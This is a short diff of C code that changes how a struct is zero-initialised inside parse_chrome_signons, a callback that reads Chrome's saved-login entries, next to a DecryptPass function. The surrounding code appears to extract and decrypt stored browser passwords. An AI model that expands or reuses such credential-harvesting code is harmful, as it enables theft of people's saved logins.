@@ -100,10 +100,8 @@ int DecryptPass(CHAR *cryptData, WCHAR *clearData, UINT clearSize)
 
 int parse_chrome_signons(void *NotUsed, int argc, char **argv, char **azColName)
 {
-	struct chp_entry chentry;
+	struct chp_entry chentry = {};
 	
-	ZeroMemory(&chentry, sizeof(chentry));
-
 	for(int i=0; i<argc; i++){
 		if (!strcmp(azColName[i], "origin_url")) {
 			swprintf_s(chentry.service, 255, L"Chrome");
